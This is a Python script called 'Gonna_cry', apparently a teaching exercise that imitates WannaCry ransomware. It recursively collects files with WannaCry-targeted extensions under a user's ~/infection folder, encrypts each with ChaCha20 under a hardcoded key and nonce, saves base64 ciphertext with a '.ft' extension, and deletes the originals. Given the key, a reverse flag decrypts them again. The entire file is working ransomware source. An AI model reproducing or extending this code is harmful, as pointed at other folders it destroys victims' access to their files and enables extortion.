import argparse
import os
import glob
from sys import exit
from base64 import b64encode, b64decode
from Crypto.Cipher import ChaCha20

def add_ft_ext(file_path):
    if (file_path.endswith(".ft") is False):
        file_path += ".ft"
    return file_path

def rm_ft_ext(file_path):
    if (file_path.endswith(".ft") is True):
        file_path = file_path.removesuffix(".ft")
    return file_path

def get_file_data(file_path, silent_bool):
    with open(file_path, "rb") as file:
        data = file.read()
        if not silent_bool:
            print("Opening : ", file_path)
        return data

def write_new_file(file_path, mode, data):
    with open(file_path, mode) as file:
        file.write(data)

def encryption_func(key, nonce, file_path, silent_bool):
        
    cipher = ChaCha20.new(key=key, nonce=nonce)

    data = get_file_data(file_path, silent_bool)

    encrypted = cipher.encrypt(data)

    ct = b64encode(encrypted).decode('utf-8')

    new_file_path = add_ft_ext(file_path)

    write_new_file(new_file_path,"w", ct)

    if file_path != new_file_path:
        os.remove(file_path)

def decryption_func(key, nonce, file_path, silent_bool):

    try :
        data = get_file_data(file_path, silent_bool)
        ciphertext = b64decode(data)
        cipher = ChaCha20.new(key=key, nonce=nonce)
        decrypted = cipher.decrypt(ciphertext)
        new_file_path = rm_ft_ext(file_path)
        if file_path != new_file_path:
            os.remove(file_path)
        try:
            write_new_file(new_file_path, "w", decrypted)
        except:
            write_new_file(new_file_path, "wb", decrypted)
    except Exception as e:
        print("Can't decrypt :", e)

def get_master_path():
    user = os.getenv("USER")

    if user is None:
        print("Can't find $USER in env")
        exit(1)

    return f"/home/{user}/infection"


def find_valid_files():

    master_path = get_master_path()

    files = glob.glob(master_path + "/**/*", recursive=True)

    valid_files = []

    data = get_file_data("wannacry_known_extensions.txt", True).decode("utf-8")

    extensions = data.split("\n")

    for file in files:
        for extension in extensions:
            if file.endswith(extension):
                valid_files.append(file)
    
    return valid_files

def find_file_to_decrypt():
    master_path = get_master_path()

    files = glob.glob(master_path + "/**/*.ft", recursive=True)

    return files

def encrypt_every_file(key, nonce, files, silent_bool):
    for file in files:
        encryption_func(key, nonce, file, silent_bool)

def decrypt_every_file(key, nonce, files, silent_bool):
    for file in files:
        decryption_func(key, nonce, file, silent_bool)

if __name__ == "__main__":
    key = "a4abffe73ac2bdefbe36c240ab480879ede028ea9761becc615bd505462ae40d"

    nonce = b'*\xc5\xc3K\x88\x00\x9f/'

    parser = argparse.ArgumentParser(description='Gonna_cry ?')

    parser.add_argument('-v', "--version", action='store_true')
    parser.add_argument('-s', "--silent", action='store_true')
    parser.add_argument('-r', "--reverse")
    args = parser.parse_args()

    if not os.path.isfile('wannacry_known_extensions.txt'):
        print("Can't find wannacry_known_extensions.txt")
        exit(1)

    if args.reverse is not None and args.reverse != key:
        print("Key is different than valid key, exiting")
        exit(1)

    if args.version is True:
        print("Gonna_Cry version 1.0")
        exit(0)

    if args.reverse:
        files = find_file_to_decrypt()
        decrypt_every_file(bytes.fromhex(key), nonce, files, args.silent)
    else:
        files = find_valid_files()
        encrypt_every_file(bytes.fromhex(key), nonce, files, args.silent)